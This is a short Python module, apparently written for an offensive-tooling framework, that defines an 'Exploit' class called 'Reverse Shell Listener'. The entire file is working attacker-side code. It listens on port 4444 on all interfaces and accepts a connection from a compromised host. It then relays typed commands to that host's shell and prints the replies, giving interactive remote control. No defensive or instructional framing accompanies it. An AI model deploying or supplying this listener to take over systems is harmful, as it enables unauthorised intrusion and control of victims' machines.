import socket

class Exploit:
    name = "Reverse Shell Listener"
    description = "Listens for a reverse shell connection and gives interactive control."
    options = {
        "LHOST": "0.0.0.0",   # Listen on all interfaces
        "LPORT": "4444"
    }

    def run(self):
        lhost = self.options["LHOST"]
        lport = int(self.options["LPORT"])

        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((lhost, lport))
            server.listen(1)
            print(f"[*] Listening on {lhost}:{lport} ...")
            conn, addr = server.accept()
            print(f"[+] Connection received from {addr[0]}:{addr[1]}")

            while True:
                cmd = input("Shell> ")
                if cmd.strip().lower() in ["exit", "quit"]:
                    conn.send(b"exit\n")
                    break
                if cmd:
                    conn.send(cmd.encode() + b"\n")
                    response = conn.recv(4096).decode(errors="ignore")
                    print(response)

            conn.close()
            server.close()
        except Exception as e:
            print(f"[!] Error: {e}")
